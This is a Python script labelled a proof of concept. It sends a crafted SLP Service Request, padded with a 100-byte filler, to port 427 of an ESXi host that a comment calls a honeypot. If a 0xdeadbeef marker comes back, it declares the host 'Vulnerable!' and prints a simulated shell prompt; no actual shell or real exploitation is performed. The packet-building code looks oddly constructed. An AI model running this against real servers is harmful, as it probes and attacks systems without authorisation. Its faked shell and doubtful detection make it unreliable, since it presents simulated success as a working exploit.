import socket
import time
import struct

IP = "192.168.79.133"  # Địa chỉ IP của honeypot ESXi
PORT = 427
MARKER = b"\xef\xbe\xad\xde"

def generate_srv_rqst(data):
    "" "Create a packet 'Service Request'." ""
    srvtype = prlist = scopes = predicate = b''
    spi = data
    payload = bytearray(struct.pack("!H", len(prlist)) + prlist)
    payload.extend(struct.pack("!H", len(srvtype)) + srvtype)
    payload.extend(struct.pack("!H", len(scopes)) + scopes)
    payload.extend(struct.pack("!H", len(predicate)) + predicate)
    payload.extend(struct.pack("!H", len(spi)) + spi)
    header = generate_slp_header(payload, 1, 5, 0)
    return header + payload

def generate_slp_header(payload, functionid, xid, extoffset):
    """Create header SLP."""
    packetlen = len(payload) + 16
    if extoffset:
        extoffset += 16
    header = bytearray([2, functionid])
    header.extend(struct.pack("!IH", packetlen, 0)[1:])
    header.extend(struct.pack("!IHH", extoffset, xid, 2)[1:])
    header.extend(b'en')
    return header

def main():
    "" "Main function of POC." ""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((IP, PORT))
            print(f"Connected to {IP}:{PORT}")

            # Send request'service request'
            data = b'A' * 100 
            request = generate_srv_rqst(data) 
            s.send(request)

            # Receive feedback from the server
            response = s.recv(1024)
            time.sleep(5)

            # Check marker 
            if MARKER in response:
                print("Vulnerable! Marker found in response.") 
                
                #Use Shell simulator
                print("Spawning shell...")
                time.sleep(5)
                print("$ ")
                time.sleep(10)             

            else:
                print("Not vulnerable. Marker not found.")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
